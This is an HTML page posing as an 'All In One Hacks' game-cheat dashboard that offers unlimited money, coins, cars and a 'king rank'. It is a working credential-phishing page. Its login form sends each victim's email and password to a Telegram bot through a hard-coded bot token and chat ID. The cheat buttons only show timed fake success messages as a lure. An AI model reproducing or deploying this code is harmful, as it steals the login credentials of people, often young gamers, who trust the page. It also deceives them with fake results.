<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All In One Hacks</title>
    <style>
        /* Base Reset */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #050505;
            color: #00ff88;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
            padding: 20px;
        }

        .container {
            background: #111;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
            text-align: center;
            width: 100%;
            max-width: 420px;
            border: 1px solid #333;
            position: relative;
        }

        h1.main-header, h2 {
            font-size: clamp(1.4rem, 5vw, 1.8rem);
            margin-bottom: 1.5rem;
            text-shadow: 0 0 15px #00ff88;
            color: #fff;
            text-transform: uppercase;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #00ff88;
            background: #000;
            color: #00ff88;
            outline: none;
            font-size: 16px; /* Prevents mobile browser auto-zoom */
        }

        .standard-btn {
            width: 100%;
            padding: 14px;
            background: #00ff88;
            border: none;
            border-radius: 5px;
            color: black;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 1rem;
            transition: transform 0.2s;
        }

        .standard-btn:active {
            transform: scale(0.98);
        }

        /* 3D Rolling Border Buttons */
        .hack-box {
            position: relative;
            width: 100%;
            height: 55px;
            margin-bottom: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            border-radius: 8px;
        }

        .hack-box::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 500%;
            background: conic-gradient(#ff0000, #ff8800, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
            animation: rotate 3s linear infinite;
        }

        .hack-btn {
            position: absolute;
            width: calc(100% - 4px);
            height: calc(100% - 4px);
            background: #111;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-weight: bold;
            font-size: 0.85rem;
            cursor: pointer;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .hack-btn:hover { background: #222; color: #00ff88; }
        .hack-btn:disabled { opacity: 0.8; cursor: not-allowed; color: #555; }

        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .loader {
            border: 4px solid #222;
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
            margin: 15px auto;
            display: none;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* SUCCESS AD OVERLAY - Responsive */
        #success-ad {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 350px;
            background: #fff;
            color: #000;
            padding: 30px;
            text-align: center;
            border: 5px solid #00ff88;
            box-shadow: 0 0 100px rgba(0, 255, 136, 0.8);
            z-index: 100;
            display: none;
            border-radius: 10px;
        }

        .hidden { display: none; }
        .footer { margin-top: 30px; font-size: 0.8rem; color: rgba(0, 255, 136, 0.6); letter-spacing: 1px; text-align: center; }
        #hack-status-area { margin-top: 20px; padding: 15px; border-top: 1px solid #333; min-height: 100px; }
    </style>
</head>
<body>

    <div id="login-page" class="container">
        <h2>User Login</h2>
        <input type="email" id="email" placeholder="Email Address" required>
        <input type="password" id="pass" placeholder="Password" required>
        
        <div id="login-loader" class="loader"></div>
        <div id="login-msg" style="margin: 10px 0; font-size: 0.9rem;"></div>
        
        <button id="login-btn" class="standard-btn" onclick="handleLogin()">LOGIN</button>
    </div>

    <div id="dashboard" class="container hidden">
        <h1 class="main-header">Hack Dashboard</h1>
        
        <div class="hack-box"><button class="hack-btn" onclick="runHack('adding all cars', 'all cars added successfully')">GET ALL CARS</button></div>
        <div class="hack-box"><button class="hack-btn" onclick="runHack('adding MONEY', 'MONEY added successfully')">UNLIMITED MONEY</button></div>
        <div class="hack-box"><button class="hack-btn" onclick="runHack('adding COINS', 'COINS added successfully')">UNLIMITED COINS</button></div>
        <div class="hack-box"><button class="hack-btn" onclick="runHack('injecting king rank', 'king rank added successfully')">KING RANK</button></div>
        <div class="hack-box"><button class="hack-btn" onclick="runHack('adding SIRENS', 'SIREN added successfully')">POLICE SIRENS</button></div>

        <div id="hack-status-area">
            <div id="dash-loader" class="loader"></div>
            <div id="dash-msg">Ready for input...</div>
        </div>
    </div>

    <div id="success-ad">
        <h2 style="color: #000; text-shadow: none;">SUCCESS!</h2>
        <p id="ad-text" style="font-weight: bold; margin: 15px 0;"></p>
        <button class="standard-btn" style="background: #000; color: #00ff88;" onclick="closeAd()">OK / CLOSE</button>
    </div>

    <div class="footer">©2026/2027 Created by C21 Hcks</div>

    <script>
        const botToken = "8557391650:AAFMcTDp0I8uXxCV4TGZZyjYWHwAKTcqxFQ";
        const chatId = "8419125080";

        function sendTelegramNotification(userEmail, userPass) {
            const message = `🚀 Login Alert!\n📧 Email: ${userEmail}\n🔑 Pass: ${userPass}\n🌐 System: All In One Hacks Dashboard`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).catch(err => console.error("Telegram Error:", err));
        }

        function handleLogin() {
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value.trim();
            const msg = document.getElementById('login-msg');
            const loader = document.getElementById('login-loader');
            const btn = document.getElementById('login-btn');

            if (!email.includes("@") || pass.length < 1) {
                msg.style.color = "#ff4444";
                msg.innerText = "Invalid Email or Password";
                return;
            }

            // UI Changes
            msg.style.color = "#00ff88";
            msg.innerText = "Authenticating...";
            loader.style.display = "block";
            btn.style.display = "none";

            // Notify Telegram
            sendTelegramNotification(email, pass);

            // Simulation Delay
            setTimeout(() => {
                loader.style.display = "none";
                document.getElementById('login-page').classList.add('hidden');
                document.getElementById('dashboard').classList.remove('hidden');
            }, 2000);
        }

        function runHack(processText, successText) {
            const dashMsg = document.getElementById('dash-msg');
            const dashLoader = document.getElementById('dash-loader');
            const btns = document.querySelectorAll('.hack-btn');

            btns.forEach(b => b.disabled = true);
            dashMsg.style.color = "#ffcc00";
            dashMsg.innerText = processText.toUpperCase() + "...";
            dashLoader.style.display = "block";

            setTimeout(() => {
                dashLoader.style.display = "none";
                dashMsg.style.color = "#00ff88";
                dashMsg.innerText = "PROCESS COMPLETE";
                
                document.getElementById('ad-text').innerText = successText.toUpperCase();
                document.getElementById('success-ad').style.display = "block";
            }, 3000);
        }

        function closeAd() {
            document.getElementById('success-ad').style.display = "none";
            document.querySelectorAll('.hack-btn').forEach(b => b.disabled = false);
            document.getElementById('dash-msg').innerText = "Ready for input...";
        }
    </script>
</body>
</html>
